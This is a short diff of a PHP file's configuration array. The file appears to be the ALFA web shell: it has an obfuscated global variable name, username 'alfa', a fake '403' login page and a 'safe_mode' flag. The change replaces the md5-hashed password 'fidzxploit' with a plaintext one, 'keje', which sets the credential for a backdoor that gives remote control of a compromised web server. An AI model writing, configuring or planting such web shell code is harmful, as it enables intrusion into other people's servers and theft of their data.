@@ -7,7 +7,7 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'a779d254da0c3fc8f90acf7c7081b14d',//md5(fidzxploit)
+    'password' => 'keje',//
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
